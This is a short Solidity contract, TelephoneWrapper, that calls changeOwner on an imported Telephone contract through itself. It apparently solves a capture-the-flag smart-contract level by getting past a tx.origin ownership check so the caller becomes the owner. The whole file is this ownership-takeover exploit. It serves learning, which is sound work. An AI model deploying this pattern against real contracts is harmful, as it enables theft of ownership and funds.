import {Telephone} from "./Telephone.sol";

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TelephoneWrapper {
    Telephone public telephone;

    constructor(address _telephone) {
        telephone = Telephone(_telephone);
    }

    function changeOwner() public {
        telephone.changeOwner(msg.sender);
    }
}
